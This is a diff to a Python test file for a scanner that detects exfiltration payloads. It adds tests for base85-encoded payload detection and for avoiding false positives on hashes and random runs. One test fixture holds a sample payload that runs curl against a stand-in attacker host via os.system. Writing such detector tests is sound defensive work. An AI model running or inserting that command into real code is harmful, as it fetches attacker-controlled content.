@@ -1,5 +1,6 @@
 """Tests for exfil evasion resistance (item 8) and bounded scanning (item 7)."""
 
+import base64
 from pathlib import Path
 
 from purser.scanners import exfil as exfil_mod
@@ -37,6 +38,24 @@ def test_hex_encoded_payload_detected():
 def test_sha256_hash_not_flagged_as_hex_payload():
     # A bare 64-char hex hash decodes to 32 random bytes, not text -> ignored.
     data = b"checkpoint sha256: " + (b"ab12cd34" * 8) + b" done"
+    findings = [f for f in ExfilScanner().scan_bytes(data)
+                if f.rule_id == "EXFIL_ENCODED_PAYLOAD"]
+    assert not findings
+
+
+# -- item: base85-encoded payloads -------------------------------------------
+
+def test_base85_encoded_payload_detected():
+    payload = b"import os; os.system('curl http://evil.example.invalid/x')"
+    data = b"\x00" * 8 + base64.b85encode(payload) + b"\x00" * 8
+    findings = [f for f in ExfilScanner().scan_bytes(data)
+                if f.rule_id == "EXFIL_ENCODED_PAYLOAD"]
+    assert findings and "Base85" in findings[0].title
+
+
+def test_base85_random_run_not_flagged():
+    # A long base85-alphabet run that decodes to binary noise, not a payload.
+    data = b"\x00" * 8 + (b"0123456789abcdefABCDEF" * 5) + b"\x00" * 8
     findings = [f for f in ExfilScanner().scan_bytes(data)
                 if f.rule_id == "EXFIL_ENCODED_PAYLOAD"]
     assert not findings
